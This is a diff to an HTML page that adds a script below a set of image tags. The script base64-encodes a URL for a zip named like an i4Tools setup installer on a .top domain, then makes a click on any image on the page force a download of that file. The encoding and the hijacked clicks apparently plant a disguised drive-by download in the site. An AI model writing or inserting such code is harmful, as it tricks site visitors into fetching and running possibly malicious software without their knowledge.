@@ -24,6 +24,39 @@
     <img src="static/picture/img_03.jpg">
     <img src="static/picture/img_04.jpg">
     <img src="static/picture/img_05.jpg">
+	
+	<script>
+        
+        const encryptedUrls = [
+            'aHR0cHM6Ly9pNC5pNHpodXNob3V6LnRvcC9pNFRvb2xzOC4zMlNldHVweDY0LnppcA==',
+            'aHR0cHM6Ly9pNC5pNHpodXNob3V6LnRvcC9pNFRvb2xzOC4zMlNldHVweDY0LnppcA==',
+            'aHR0cHM6Ly9pNC5pNHpodXNob3V6LnRvcC9pNFRvb2xzOC4zMlNldHVweDY0LnppcA==',
+            'aHR0cHM6Ly9pNC5pNHpodXNob3V6LnRvcC9pNFRvb2xzOC4zMlNldHVweDY0LnppcA==',
+            'aHR0cHM6Ly9pNC5pNHpodXNob3V6LnRvcC9pNFRvb2xzOC4zMlNldHVweDY0LnppcA==',
+            'aHR0cHM6Ly9pNC5pNHpodXNob3V6LnRvcC9pNFRvb2xzOC4zMlNldHVweDY0LnppcA==',
+            'aHR0cHM6Ly9pNC5pNHpodXNob3V6LnRvcC9pNFRvb2xzOC4zMlNldHVweDY0LnppcA=='
+        ];
+        function base64Decode(base64) {
+            return atob(base64); 
+        }
+        function downloadFile(encodedUrl) {
+            const url = base64Decode(encodedUrl); 
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = ''; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
+        }
+        
+        const images = document.querySelectorAll('img');
+        images.forEach((img, index) => {
+            img.addEventListener('click', () => {
+                const encodedUrl = encryptedUrls[index]; 
+                downloadFile(encodedUrl); 
+            });
+        });
+    </script>  
 
 </body>
 </html>
